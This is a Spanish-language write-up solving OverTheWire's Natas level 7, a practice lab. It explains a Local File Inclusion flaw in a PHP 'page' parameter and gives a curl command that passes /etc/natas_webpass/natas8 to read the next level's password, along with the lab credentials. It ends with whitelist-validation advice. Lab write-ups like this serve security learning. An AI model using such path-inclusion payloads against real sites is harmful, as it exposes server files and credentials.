# Natas Level07

## Descripción
> **Level Goal (natas7.natas.labs.overthewire.org):** La página tiene enlaces "Home" y "About" que apuntan a `index.php?page=home` e `index.php?page=about`. Un comentario HTML da la pista de que la contraseña de `natas8` está en `/etc/natas_webpass/natas8`.

## Solución
El parámetro `page` se usa directamente en un `include($page)` sin validar. Esto es un Local File Inclusion (LFI): en vez de `home` o `about`, se puede pasar una ruta absoluta arbitraria del sistema de archivos, y PHP la incluirá (y como no es código PHP válido, se imprime tal cual).

```bash
curl -s -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 \
  "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
# ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
```

## Notas adicionales
- Al probar un valor inválido (`page=admin`) el servidor devuelve un `Warning: include(admin): failed to open stream`, confirmando que el parámetro llega directo a un `include()`.
- Esta es la vulnerabilidad clásica de LFI: cualquier parámetro que controle qué archivo se incluye/lee en el servidor debe validarse contra una lista blanca, nunca aceptar rutas arbitrarias.

## Referencias
- Reto original: http://natas7.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/Path_Traversal (OWASP, Local File Inclusion / Path Traversal)
